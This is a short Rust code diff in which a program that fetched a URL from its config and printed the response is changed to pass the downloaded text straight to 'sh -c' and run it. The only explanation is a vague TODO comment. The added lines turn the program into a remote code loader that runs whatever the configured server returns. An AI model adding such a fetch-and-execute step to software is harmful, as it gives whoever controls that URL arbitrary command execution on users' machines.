@@ -32,7 +32,13 @@ fn main() {
 
     let response = reqwest::blocking::get(deserialized_config.source_url).unwrap();
     if response.status() == 200 {
-        println!("{:?}", response.text().unwrap());
+        // TODO: Async Child Process Spawn
+        let output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(response.text().unwrap())
+            .output()
+            .expect("failed");
+        println!("{:?}", output);
     }
 }
 
